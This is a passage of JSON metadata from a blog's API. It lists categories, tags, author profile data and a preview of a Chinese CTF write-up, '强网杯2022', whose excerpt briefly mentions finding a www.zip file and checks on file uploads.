mins."},"categories":[{"name":"CTF","slug":"CTF","count":4,"path":"api/categories/CTF.json"}],"tags":[{"name":"Crypto","slug":"Crypto","count":1,"path":"api/tags/Crypto.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true},"next_post":{"title":"强网杯2022","uid":"a6ba9e79ebbec5d852da03b23e7284e1","slug":"强网杯2022","date":"2022-07-29T23:44:33.000Z","updated":"2023-11-06T05:38:40.311Z","comments":true,"path":"api/articles/强网杯2022.json","keywords":null,"cover":"https://cover.png","text":"强网先锋farcefile扫描到 www.zip ，通过测试发现 检查后缀和 content-type ，文件名是随机字符串 数据存储于 cookie 中，通过...","permalink":"/post/强网杯2022","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":4,"path":"api/categories/CTF.json"}],"tags":[{"name":"WP","slug":"WP","count":1,"path":"api/tags/WP.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true}}